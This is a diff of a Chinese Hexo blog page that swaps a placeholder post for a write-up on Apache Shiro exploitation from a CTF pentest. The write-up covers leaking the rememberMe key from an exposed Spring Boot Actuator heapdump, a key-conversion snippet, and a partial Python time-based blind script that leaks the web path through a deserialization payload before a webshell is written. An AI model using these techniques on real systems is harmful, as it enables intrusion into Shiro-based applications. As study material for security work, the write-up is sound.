@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            遇到的一些Shiro利用 |
         
         Nbc&#39;s Blog
     </title>
@@ -262,7 +262,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Hello World
+                        遇到的一些Shiro利用
                     </div>
                 
 
@@ -290,13 +290,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-star"></i>&nbsp;
-                <span class="datetime">2026-01-25 16:54:50</span>
+                <span class="datetime">2026-03-02 14:24:35</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Sun Mar 01 2026 21:32:36 GMT+0800">2026-03-01 21:32:36</span>
+                    <span class="datetime" data-updated="Mon Mar 02 2026 15:39:46 GMT+0800">2026-03-02 15:39:46</span>
                 </span>
             
         
@@ -305,7 +305,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/test/">test</a></li>
+                            <li class="category-item"><a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a></li>
                         
                     
                 </ul>
@@ -316,7 +316,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/test/">test</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></li>
                         
                     
                 </ul>
@@ -326,12 +326,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>75 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>755 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>3 分钟</span>
             </span>
         
         
@@ -353,19 +353,95 @@
                     
 
                     
-                         <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                         <h1 id="遇到的一些Shiro利用"><a href="#遇到的一些Shiro利用" class="headerlink" title="遇到的一些Shiro利用"></a>遇到的一些Shiro利用</h1><h2 id="heapdump泄露密钥key"><a href="#heapdump泄露密钥key" class="headerlink" title="heapdump泄露密钥key"></a>heapdump泄露密钥key</h2><p>这个是在ciscn final渗透中遇到的。</p>
+<p>在这里大概记录一下（想搭个环境最后利用老是坏掉，开发的能力还是很欠缺）</p>
+<p>访问这个接口&#x2F;actuator&#x2F;</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731104226697.png"
+                        alt="image-20240731104226697"
+                 ></p>
+<p>Spring Boot Actuator 是一个非常强大的工具包，它提供了一组内置的端点（endpoints），用于监控和管理 Spring Boot 应用程序。这些端点可以提供有关应用程序的运行时信息，例如健康状态、环境变量、HTTP 路由等，还可以执行诸如清理缓存、触发垃圾回收等操作。</p>
+<p>heapdump是生成的一个包含 Java 虚拟机（JVM）堆内存状态的文件</p>
+<p>默认情况下，Actuator 提供的许多端点是禁用的</p>
+<p>所以在可以匿名访问或者未授权访问时能用，一般配置里这样写</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">management:</span><br><span class="line">  endpoints:</span><br><span class="line">    web:</span><br><span class="line">      exposure:</span><br><span class="line">        include: health,info,heapdump</span><br><span class="line">  endpoint:</span><br><span class="line">    health:</span><br><span class="line">      show-details: always</span><br><span class="line">    heapdump:</span><br><span class="line">      enabled: true</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">management.endpoints.web.exposure.include</span>=<span class="string">health,info,heapdump</span></span><br><span class="line"><span class="attr">management.endpoint.health.show-details</span>=<span class="string">always</span></span><br><span class="line"><span class="attr">management.endpoint.heapdump.enabled</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>点击可以下载heapdump文件</p>
+<p>我们可以使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/dioos886/heapdump_tool" >工具<i class="fas fa-external-link-alt"></i></a>做掉它</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731104847308.png"
+                        alt="image-20240731104847308"
+                 ></p>
+<p>可以看到不只key其实还有很多其他东西可以探索</p>
+<p>除了这个工具我们还可以使用java自带的</p>
+<p>jvisualvm.exe：Java自带的工具，默认路径为：JDK目录&#x2F;bin&#x2F;jvisualvm.exe</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731105130436.png"
+                        alt="image-20240731105130436"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731105241536.png"
+                        alt="image-20240731105241536"
+                 ></p>
+<p>可以进行类的过滤，想想我们分析shiro反序列化原理时候的类，我们可以搜一下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731105450348.png"
+                        alt="image-20240731105450348"
+                 ></p>
+<p>看看<code>CookieRememberMeMananger</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731105528027.png"
+                        alt="image-20240731105528027"
+                 ></p>
+<p>找到key使用脚本转换一下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(struct.pack(<span class="string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>, -<span class="number">82</span>, -<span class="number">68</span>, <span class="number">32</span>, -<span class="number">43</span>, -<span class="number">68</span>, -<span class="number">49</span>, -<span class="number">114</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">83</span>, -<span class="number">84</span>, -<span class="number">69</span>, -<span class="number">19</span>, <span class="number">10</span>, -<span class="number">14</span>, <span class="number">121</span>)))</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240731110006026.png"
+                        alt="image-20240731110006026"
+                 ></p>
+<h2 id="Shrio不出网利用"><a href="#Shrio不出网利用" class="headerlink" title="Shrio不出网利用"></a>Shrio不出网利用</h2><p>不出网显而易见就是无法访问外网，很多情况就是能拿到shell但是没办法反弹shell，可能就是把服务器的某个端口映射出来了等等</p>
+<p>检测可以使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/zhzyker/shiro-1.2.4-rce" >zhzyker&#x2F;shiro-1.2.4-rce: shiro &lt;&#x3D; 1.2.4 反序列化远程命令执行利用脚本 (github.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>改写了ysoserial，增加时延来判断是否存在漏洞</p>
+<p>遍历链子和key来判断利用链</p>
+<p>成功后可以进一步利用</p>
+<p>在我的了解下主要就是这几个方面解决shiro不出网利用：</p>
+<ul>
+<li>定位Web目录写入文件</li>
+</ul>
+<p>比如可以在前端源码中找到某个文件夹是存放文件的可以写进去</p>
+<ul>
+<li>构造回显</li>
+</ul>
+<p>构造通用回显</p>
+<ul>
+<li>内存马</li>
+</ul>
+<p>写内存马</p>
+<ul>
+<li>时间延迟获取Web路径写入webshell</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BinarySearch</span>(<span class="params">target, index, left, right, lowerStdLimit</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = (left + right)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == left:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        code1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">String var1 = Thread.currentThread().getContextClassLoader().getResource(&quot;&quot;).getPath();</span></span><br><span class="line"><span class="string">int a = (int) var1.charAt(%d);</span></span><br><span class="line"><span class="string">if (a &lt; %d) &#123;</span></span><br><span class="line"><span class="string">    Thread.currentThread().sleep(5000L);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (index, mid)</span><br><span class="line"></span><br><span class="line">        code2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">String var1 = Thread.currentThread().getContextClassLoader().getResource(&quot;&quot;).getPath();</span></span><br><span class="line"><span class="string">int a = (int) var1.charAt(%d);</span></span><br><span class="line"><span class="string">if (a &lt; %d) &#123;</span></span><br><span class="line"><span class="string">    Thread.currentThread().sleep(0000L);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (index, mid)</span><br><span class="line"></span><br><span class="line">        code1_base64 = base64.b64encode(code1)</span><br><span class="line">        re_value1 = poc(code1_base64)</span><br><span class="line"></span><br><span class="line">        code2_base64 = base64.b64encode(code2)</span><br><span class="line">        re_value2 = poc(code2_base64)</span><br><span class="line"></span><br><span class="line">        time1 = resp_time(target, re_value1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time1 &gt; lowerStdLimit:</span><br><span class="line">            time2 = resp_time(target, re_value2)</span><br><span class="line">            <span class="keyword">if</span> time2 &lt;= lowerStdLimit:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+
+
 
                     
                 </div>
@@ -376,11 +452,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                Hello World
+                遇到的一些Shiro利用
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2026/01/25/hello-world/
+                2026/03/02/遇到的一些Shiro利用/
             </div>
         </div>
 
@@ -396,7 +472,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2026-01-25 16:54</div>
+                <div class="content">2026-03-02 14:24</div>
             </div>
 
 
@@ -432,7 +508,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/test/">test</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
                                     </li>
                                 
                             </ul>
@@ -471,22 +547,22 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2026/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%8B%93%E5%B1%95%E5%AD%A6%E4%B9%A0/"
-                                   title="PHP反序列化之Phar和Session"
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/02/Java%E5%AE%89%E5%85%A8Shiro%E7%AF%87%E5%AD%A6%E4%B9%A0/"
+                                   title="Java安全Shiro篇"
                                 >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">PHP反序列化之Phar和Session</span>
-                                        <span class="post-nav-item">上一篇</span>
+                                        <span class="post-nav-title-item text-ellipsis">Java安全Shiro篇</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
-                        
                         
                     </div>
                 
@@ -507,7 +583,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9BShiro%E5%88%A9%E7%94%A8"><span class="nav-text">遇到的一些Shiro利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#heapdump%E6%B3%84%E9%9C%B2%E5%AF%86%E9%92%A5key"><span class="nav-text">heapdump泄露密钥key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shrio%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-text">Shrio不出网利用</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -685,7 +761,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9BShiro%E5%88%A9%E7%94%A8"><span class="nav-text">遇到的一些Shiro利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#heapdump%E6%B3%84%E9%9C%B2%E5%AF%86%E9%92%A5key"><span class="nav-text">heapdump泄露密钥key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shrio%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-text">Shrio不出网利用</span></a></li></ol></li></ol>
     </div>
 </div>
 
